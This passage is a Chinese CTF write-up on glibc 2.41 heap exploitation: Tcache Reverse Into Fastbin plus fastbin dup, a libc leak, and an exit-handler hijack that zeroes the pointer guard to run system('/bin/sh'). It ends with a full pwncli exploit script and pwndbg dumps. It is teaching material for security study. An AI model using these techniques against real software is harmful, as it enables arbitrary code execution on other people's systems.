此时fastbin中，假定chunk链表为：A->B->C，则A会被分配走，然后B和C会依次填入tcachebin

如果 C 的 fd 被我们控制，指向了我们指定的地方（2.41下，目标地址需要其fd解密结果是0），那么就会将指定地方作为tcache chunk 存入 tcachebin 中

### 源码分析：2.41 下的 fastbin dup 技巧

2.41下 fastbin dup和之前没有什么区别，其流程发生在free过程中：

```
    unsigned int idx = fastbin_index(size);
    fb = &fastbin (av, idx);  // 取出 fastbin 第一个 chunk

    /* Atomically link P to its fastbin: P->FD = *FB; *FB = P;  */
    mchunkptr old = *fb, old2;

    if (SINGLE_THREAD_P)
      {
    /* Check that the top of the bin is not the record we are going to
       add (i.e., double free).  */
    if (__builtin_expect (old == p, 0)) // 检查和fastbin第一个chunk是否相同，相同则认为发生了 double free
      malloc_printerr ("double free or corruption (fasttop)");
    p->fd = PROTECT_PTR (&p->fd, old);  // 加密指针，存入
    *fb = p;
      }
```

只检查在 fastbin 链表中第一个chunk，和释放的chunk是否相同

只需要申请两个chunk，A和B

按照A，B，A的顺序释放

fastbin的链就会变成A->B->A

### Tcache Reverse Into Fastbin 组合 fastbin dup 技巧

如果说，在之前设想的Tcache Reverse Into Fastbin场景里，我的fastbin chunk的链通过fastbin dup之后变成了A->B->A

此时申请相同大小的chunk，触发Tcache Reverse Into Fastbin的流程，就会将A分配走，然后将B插入tcachebin，再将A插入tcachebin

程序流程中会向A中写入数据，此时写入目标地址（需要其fd处解密结果是0），那么tcache链就会由A->B变成A->目标

最终可以得到一个任意地址分配的原语，如果fd处解密结果不为0，就会向tcache链表写入一个不可访问的地址，以至于该size的tcahebin不能再使用，题目只能用2个size的chunk

### 任意地址分配原语

这里是按照流程走下来之后，完成fastbin dup之后，准备触发Tcache Reverse Into Fastbin的时候，此时我在第一个chunk处准备了经过解密可以得到0的值：

```
0x5643909ab380  0x0000000000000000      0x0000000000000061      ........a.......
0x5643909ab390  0x00000005643909ab      0x00000005643909ab      ..9d......9d....
0x5643909ab3a0  0x00000005643909ab      0x00000005643909ab      ..9d......9d....
0x5643909ab3b0  0x00000005643909ab      0x00000005643909ab      ..9d......9d....
0x5643909ab3c0  0x00000005643909ab      0x00000005643909ab      ..9d......9d....
0x5643909ab3d0  0x00000005643909ab      0x00000005643909ab      ..9d......9d....
0x5643909ab3e0  0x00000005643909ab      0x0000000000000061      ..9d....a.......

...

0x5643909ab620  0x4242424242424242      0x0000000000000061      BBBBBBBBa.......         <-- fastbins[0x60][0], fastbins[0x60][0]
0x5643909ab630  0x00005646f4a3bf2b      0x4141414141414141      +...FV..AAAAAAAA
0x5643909ab640  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab650  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab660  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab670  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab680  0x4141414141414141      0x0000000000000061      AAAAAAAAa.......         <-- fastbins[0x60][1]
0x5643909ab690  0x00005646f4a3bf8b      0x4141414141414141      ....FV..AAAAAAAA
0x5643909ab6a0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab6b0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab6c0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab6d0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab6e0  0x4141414141414141      0x0000000000000061      AAAAAAAAa.......
0x5643909ab6f0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab700  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab710  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab720  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab730  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab740  0x4141414141414141      0x0000000000000061      AAAAAAAAa.......
0x5643909ab750  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab760  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab770  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab780  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab790  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab7a0  0x4141414141414141      0x000000000001f861      AAAAAAAAa.......         <-- Top chunk
```

此时，我再申请一个0x60的chunk，触发Tcache Reverse Into Fastbin：

```
0x5643909ab380  0x0000000000000000      0x0000000000000061      ........a.......
0x5643909ab390  0x00000005643909ab      0x00000005643909ab      ..9d......9d....
0x5643909ab3a0  0x00000005643909ab      0x00000005643909ab      ..9d......9d....         <-- tcachebins[0x60][2/3]
0x5643909ab3b0  0x00000005643909ab      0x00000005643909ab      ..9d......9d....
0x5643909ab3c0  0x00000005643909ab      0x00000005643909ab      ..9d......9d....
0x5643909ab3d0  0x00000005643909ab      0x00000005643909ab      ..9d......9d....
0x5643909ab3e0  0x00000005643909ab      0x0000000000000061      ..9d....a.......

...

0x5643909ab630  0x00005646f4a3ba0b      0x4343434343434343      ....FV..CCCCCCCC         <-- tcachebins[0x60][1/3]
0x5643909ab640  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
0x5643909ab650  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
0x5643909ab660  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
0x5643909ab670  0x4343434343434343      0x4343434343434343      CCCCCCCCCCCCCCCC
0x5643909ab680  0x4343434343434343      0x0000000000000061      CCCCCCCCa.......
0x5643909ab690  0x00005646f4a3bf9b      0x3440601815321279      ....FV..y.2..`@4         <-- tcachebins[0x60][0/3]
0x5643909ab6a0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab6b0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab6c0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab6d0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab6e0  0x4141414141414141      0x0000000000000061      AAAAAAAAa.......
0x5643909ab6f0  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab700  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab710  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab720  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab730  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab740  0x4141414141414141      0x0000000000000061      AAAAAAAAa.......
0x5643909ab750  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab760  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab770  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab780  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab790  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x5643909ab7a0  0x4141414141414141      0x000000000001f861      AAAAAAAAa.......         <-- Top chunk
```

此时的bins信息：

```
pwndbg> bins
tcachebins
0x60 [  3]: 0x5643909ab690 —▸ 0x5643909ab630 —▸ 0x5643909ab3a0 ◂— 0
0x110 [  1]: 0x5643909aa680 ◂— 0
0x160 [  1]: 0x5643909aa520 ◂— 0
fastbins
empty
unsortedbin
empty
```

成功将chunk1的中间加入到了tcachebin，达成任意地址分配

操作流程：

```
for i in range(11):
    add(i,b"A"*0x58)

for i in range(7):
    dele(i)
dele(7)
dele(8)
dele(7)
for i in range(6,-1,-1):
    add(i,b"B"*0x58)

dele(0)
add(0,(pack((heap_base+0x1000)>>12))*11)
add(7,pack((heap_base+0x13a0)^((heap_base+0x16a0)>>12))+b"C"*0x50)
```

### 泄露 libc 地址

泄露 libc 地址需要伪造unsortedbin size，将刚刚的分配到chunk1中间的那个chunk，通过chunk1将其size设置为unsortedbin size，需要注意，unsortedbin chunk next chunk也需要伪造

伪造完之后，直接释放，UAF读，即可拿到libc地址：

```
0x55dc3ef75380  0x0000000000000000      0x0000000000000061      ........a.......
0x55dc3ef75390  0x0000000000000000      0x0000000000000061      ........a.......
0x55dc3ef753a0  0x0000000000000000      0x0000000000000000      ................
0x55dc3ef753b0  0x0000000000000000      0x0000000000000000      ................
0x55dc3ef753c0  0x0000000000000000      0x0000000000000000      ................
0x55dc3ef753d0  0x0000000000000000      0x0000000000000000      ................
0x55dc3ef753e0  0x0000000000000000      0x0000000000000061      ........a.......
0x55dc3ef753f0  0x0000000000000000      0x00000000000003c1      ................         <-- unsortedbin[all][0]
0x55dc3ef75400  0x00007f2b89310d00      0x00007f2b89310d00      ..1.+.....1.+...
0x55dc3ef75410  0x4242424242424242      0x4242424242424242      BBBBBBBBBBBBBBBB
0x55dc3ef75420  0x4242424242424242      0x4242424242424242      BBBBBBBBBBBBBBBB
0x55dc3ef75430  0x4242424242424242      0x4242424242424242      BBBBBBBBBBBBBBBB
0x55dc3ef75440  0x4242424242424242      0x0000000000000061      BBBBBBBBa.......

...

0x55dc3ef75740  0x4141414141414141      0x0000000000000061      AAAAAAAAa.......
0x55dc3ef75750  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x55dc3ef75760  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x55dc3ef75770  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x55dc3ef75780  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA
0x55dc3ef75790  0x4141414141414141      0x4141414141414141      AAAAAAAAAAAAAAAA

0x55dc3ef757a0  0x4141414141414141      0x0000000000000061      AAAAAAAAa.......

0x55dc3ef757b0  0x00000000000003c0      0x0000000000000050      ........P.......
0x55dc3ef757c0  0x0000000000000000      0x0000000000000041      ........A.......
0x55dc3ef757d0  0x0000000000000000      0x0000000000000031      ........1.......
0x55dc3ef757e0  0x0000000000000000      0x0000000000000021      ........!.......
0x55dc3ef757f0  0x0000000000000000      0x0000000000000011      ................
0x55dc3ef75800  0x0000000000000000      0x000000000001f801      ................         <-- Top chunk
```

完整的泄露libc地址的代码：

```
for i in range(11):
    add(i,b"A"*0x58)

for i in range(7):
    dele(i)
dele(7)
dele(8)
dele(7)
for i in range(6,-1,-1):
    add(i,b"B"*0x58)

dele(0)
add(0,(pack((heap_base+0x1000)>>12))*11)
add(7,pack((heap_base+0x13a0)^((heap_base+0x16a0)>>12))+b"C"*0x50)

# """
# overwrite tcachebin size to unsortedbin size
# """
add(8,b"D"*0x58)
add(7,b"E"*0x58)
add(10,b"a"*0x58)
dele(9)

add(9,b"G"*0x40+pack(0)+pack(0x21)+b"A"*8)
dele(0)
add(0,pack(0)+pack(0x421)+b"q"*0x48)
add(9,pack(0)+pack(0x51) + pack(0) + pack(0x41) + pack(0)+ pack(0x31) + pack(0) + pack(0x21) + pack(0) + pack(0x11) + pack(0))
dele(10) 
show(10)
ru(b"burgir[10]: ")
libc_leak = r(8)
libc_leak = u64(libc_leak)
success(f"libc_leak = {hex(libc_leak)}")
libc.address = libc_leak -  0x1d3d00
success(f"libc.address = {hex(libc.address)}")  

add(10,pack(0)*9 + pack(0x61) + pack(0))
```

此时的bins：

```
pwndbg> bins
tcachebins
0x110 [  1]: 0x55dc3ef74680 ◂— 0
0x160 [  1]: 0x55dc3ef74520 ◂— 0
fastbins
empty
unsortedbin
all: 0x55dc3ef753f0 —▸ 0x7f2b89310d00 (main_arena+96) ◂— 0x55dc3ef753f0
smallbins
empty
largebins
empty
```

0x60的tcachebin没有被损坏，还能用该size再次进行任意地址分配

接下来的问题就是，往哪里申请？接下来无法泄露任何数据了，只能任意地址分配和写

无法泄露pg，无法泄露environ

感觉可行的方案：

* 可以写\_IO\_File\_plus指针到堆，在堆里构造IO通过程序退出流程触发IO刷新
* 直接打 exit 流程，篡改pg的值，然后伪造initial结构体，触发退出流程执行函数

### 源码分析：2.41 下的 exit 攻击向量

退出的流程主要在runexithandlers函数中：遍历结构体数组exit\_function\_list，对每组的exit\_function函数进行处理

```
while (true) {
    struct exit_function_list *cur = *listp;
    
    if (cur == NULL) {
        __exit_funcs_done = true;
        break;
    }
    
    while (cur->idx > 0) {
        struct exit_function *f = &cur->fns[--cur->idx];
        
        switch (f->flavor) {
            case ef_on:    // on_exit函数
            case ef_at:    // atexit函数  
            case ef_cxa:   // C++析构函数
                // 执行函数...
        }
    }
    
    // 释放当前块，移动到下一个块
    *listp = cur->next;
    if (*listp != NULL) free(cur);
}
```

这里的listp追溯过去，发现是全局变量initial：

```
struct exit_function_list *__exit_funcs = &initial;
```

这里涉及到的的的结构体：

```
struct exit_function_list {
    struct exit_function_list *next;  // 链表指针
    size_t idx;                       // 当前使用的索引
    struct exit_function fns[32];     // 函数数组（每个块32个函数）
};


struct exit_function {
    long int flavor;        // 函数类型标识
    union {
        void (*at) (void);  // atexit函数指针
        struct {
            void (*fn) (int status, void *arg);  // on_exit函数指针
            void *arg;      // 用户参数
        } on;
        struct {
            void (*fn) (void *arg, int status);  // __cxa_atexit函数指针
            void *arg;      // 用户参数
            void *dso_handle;  // DSO句柄
        } cxa;
    } func;
};
```

这里的switch是个枚举类型：

* ​`ef_on` (2): onexit注册的函数
* ​`ef_at` (3): atexit注册的函数
* ​`ef_cxa` (4): cxaatexit注册的函数（C++析构函数）

这里主要关注ef\_cxa的情况：

```
        case ef_cxa:   // __cxa_atexit注册的函数（C++析构函数）
          /* To avoid dlclose/exit race calling cxafct twice (BZ 22180),
         we must mark this function as ef_free.  */
          /* 为了避免dlclose/exit竞争条件导致cxafct被调用两次(BZ 22180)，
         我们必须将此函数标记为ef_free */
          f->flavor = ef_free;
          cxafct = f->func.cxa.fn;
          arg = f->func.cxa.arg;
          PTR_DEMANGLE (cxafct);  // 解密函数指针

          /* Unlock the list while we call a foreign function.  */
          /* 在调用外部函数时解锁列表 */
          __libc_lock_unlock (__exit_funcs_lock);
          cxafct (arg, status);  // 【PWN关键点】调用C++析构函数
          __libc_lock_lock (__exit_funcs_lock);
          break;
```

这里从结构体exit\_function对应cxa的部分中，获取函数地址，参数地址，解密函数指针，然后调用函数

解密过程：

```
#define PTR_MANGLE(var) \
  (var) = (__typeof (var)) ((uintptr_t) (var) ^ __pointer_chk_guard_local)
#define PTR_DEMANGLE(var) PTR_MANGLE (var)
```

此处会调用pointer\_guard进行异或操作，实际上这里还有个右移0x11位的操作在，在gdb中可以明显看到：

```
   0x7f4524b32f60 <__run_exit_handlers+336>    mov    rcx, qword ptr [rax + 0x18]     RCX, [initial+24] => 0xfe8a496834800000
   0x7f4524b32f64 <__run_exit_handlers+340>    mov    r8, qword ptr [rax + 0x20]      R8, [initial+32] => 0x7f4524c87ea4 ◂— 0x68732f6e69622f /* '/bin/sh' */
 ► 0x7f4524b32f68 <__run_exit_handlers+344>    mov    qword ptr [rax + 0x10], 0       [initial+16] <= 0
   0x7f4524b32f70 <__run_exit_handlers+352>    mov    rax, rcx                        RAX => 0xfe8a496834800000
   0x7f4524b32f73 <__run_exit_handlers+355>    mov    ecx, r12d                       ECX => 0
   0x7f4524b32f76 <__run_exit_handlers+358>    ror    rax, 0x11
   0x7f4524b32f7a <__run_exit_handlers+362>    xor    rax, qword ptr fs:[0x30]        RAX => 0x7f4524b41a40 (system) (0x7f4524b41a40 ^ 0x0
```

这里截图是完成调试最终的结果，取出initial+0x18作为函数地址，循环右移0x11位，然后和fs:[0x30]进行异或，得到函数地址

参数则是直接获取

initial此处需要构造的结构体就是：

```
struct exit_function_list {
    struct exit_function_list *next;  // 设置为0
    size_t idx;                       // 设置为1
    struct exit_function fns[32];     // 填充一个结构体，按照cxa去填充
};

struct exit_function {		// cxa的结构体
    long int flavor;        // 4
    void (*fn) (void *arg, int status);  // 函数指针
    void *arg;      		// 参数指针
    void *dso_handle;  		// 随便设置
};
```

其中，这里的函数指针需要是和pg进行异或，并且循环左移0x11位的结果

要完成这一切就能劫持控制流，就需要能够直到pg的值，或者设置pg的值

### 劫持控制流 drop shell

基于之前的Tcache Reverse Into Fastbin和Fastbin Dup组合利用的方式，再来一次，将pg的值覆盖为0，这样0异或任何值都不会发生变化

fs寄存器指向的地址位于举例libc.address-0x2880处，其0x30偏移处就是pg的值：

```
pwndbg> tele 0x7f4524af2780
00:0000│ fs_base 0x7f4524af2780 ◂— 0x7f4524af2780
01:0008│         0x7f4524af2788 —▸ 0x7f4524af3120 ◂— 1
02:0010│         0x7f4524af2790 —▸ 0x7f4524af2780 ◂— 0x7f4524af2780
03:0018│         0x7f4524af2798 ◂— 0
04:0020│         0x7f4524af27a0 ◂— 0
05:0028│         0x7f4524af27a8 ◂— 0xa9379609e4922e00
06:0030│         0x7f4524af27b0 ◂— 0
07:0038│         0x7f4524af27b8 ◂— 0
```

对该地址任意地址分配，写入，会导致该size的tcachebin损坏无法再用

```
pwndbg> bins
tcachebins
0x60 [  0]: 0x33ea2de158f42a18
0x110 [  1]: 0x55a07ae54680 ◂— 0
0x160 [  1]: 0x55a07ae54520 ◂— 0
```

就需要切换下一个size去做后续的事情，然后就只需要设置号initial的值即可：

```
pwndbg> tele &initial
00:0000│ rax r15 0x7f4524cca1e0 (initial) ◂— 0
01:0008│         0x7f4524cca1e8 (initial+8) ◂— 0
02:0010│         0x7f4524cca1f0 (initial+16) ◂— 4
03:0018│         0x7f4524cca1f8 (initial+24) ◂— 0xfe8a496834800000
04:0020│         0x7f4524cca200 (initial+32) —▸ 0x7f4524c87ea4 ◂— 0x68732f6e69622f /* '/bin/sh' */
05:0028│         0x7f4524cca208 (initial+40) ◂— 'xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
```

最终会执行到：

```
 ► 0x7f4524b32f94 <__run_exit_handlers+388>    call   rax                         <system>
        command: 0x7f4524c87ea4 ◂— 0x68732f6e69622f /* '/bin/sh' */
```

从而拿到shell，具体操作脚本见下面完整exp

## 完整exp

```
#!/usr/bin/env python3
from pwncli import *
cli_script()
set_remote_libc('libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF =gift.libc


def pack_data():
    return bytes([10,0xf0,0x0f,4]) + bytes([0,0xf0,0x0f,4])

data = flat({
    # header check
    0:bytes([0x53, 0x80, 0xF6, 0x34]),
    0x58:b"PICT",
    0x5c:p16(0x5500),   # width big endian
    0x5e:p16(0x100),   # height big endian
    0x68:bytes([0,8,0,0xf0]), # header info
    0x6c:pack_data()*0x40
},filler=b"\x00")

sz = len(data)
ru(b"Enter image size in bytes: ")
sl(str(sz).encode())
sl(data)

ru(b"yo face = ")
num = rl()[:-1]
success(f"num = {num} / 4919")

def cmd(i, prompt=b">> "):
    sla(prompt, i)

def add(idx, data):
    cmd('1')
    sla(b"order: ", str(idx).encode())
    sla(b"describe ", data)
    #......

def dele(idx):
    cmd('2')
    sla(b"throw? D: ", str(idx).encode())
    #......

def show(idx):
    cmd('31')
    sla(b"food where: ", str(idx).encode())
    #......

add(0,b"A"*0x58)
dele(0)
show(0)
ru(b"burgir[0]: ")
heap_leak = r(8)
heap_leak = u64(heap_leak)
success(f"heap_leak = {hex(heap_leak)}")
heap_base = (heap_leak << 12 )- 0x1000


for i in range(11):
    add(i,b"A"*0x58)

for i in range(7):
    dele(i)
dele(7)
dele(8)
dele(7)
for i in range(6,-1,-1):
    add(i,b"B"*0x58)

dele(0)
add(0,(pack((heap_base+0x1000)>>12))*11)
add(7,pack((heap_base+0x13a0)^((heap_base+0x16a0)>>12))+b"C"*0x50)

add(8,b"D"*0x58)
add(7,b"E"*0x58)
add(10,b"a"*0x58)
dele(9)

add(9,b"G"*0x40+pack(0)+pack(0x21)+b"A"*8)
dele(0)
add(0,pack(0)+pack(0x421)+b"q"*0x48)
add(9,pack(0)+pack(0x51) + pack(0) + pack(0x41) + pack(0)+ pack(0x31) + pack(0) + pack(0x21) + pack(0) + pack(0x11) + pack(0))
dele(10) 
show(10)
ru(b"burgir[10]: ")
libc_leak = r(8)
libc_leak = u64(libc_leak)
success(f"libc_leak = {hex(libc_leak)}")
libc.address = libc_leak -  0x1d3d00
success(f"libc.address = {hex(libc.address)}")  

add(10,pack(0)*9 + pack(0x61) + pack(0))

for i in range(1,8,1):
    dele(i)

dele(8)
dele(9)
dele(8)

for i in range(7,0,-1):
    add(i,b"B"*0x58)

tls = libc.address - 0x2880
pg = 0
add(8,pack((tls+0x30)^((heap_base+0x1700)>>12))+b"C"*0x50)
add(9,b"x"*0x30+pack(0x3f0)+pack(0x20)+pack(0)*3)
add(8,b"x"*0x58)
add(0,pack(0)+b"\x00"*0x50)

dele(1)
add(1,pack(0)+pack(0x3f1)+pack(libc_leak)*2+pack(0)*7)

for i in range(0,9):
    add(i,b"A"*0x48)

for i in range(6,-1,-1):
    dele(i)

dele(7)
dele(8)
dele(7)

for i in range(6,-1,-1):
    add(i,b"D"*0x48)

add(7,pack((libc.sym.initial)^((heap_base+0x1620)>>12))+pack(0)*8)
add(8,b"x"*0x48)
add(7,b"x"*0x48)

system = libc.sym.system
binsh = next(libc.search(b"/bin/sh\x00")    )
success(f"binsh = {hex(binsh)}")
add(9,pack(0)+pack(1)+pack(4)+pack(system<<0x11)+pack(binsh)+b"x"*0x20)

cmd(b"balabala")

ia()
```

## 参考资料

* glibc-2.41 源码
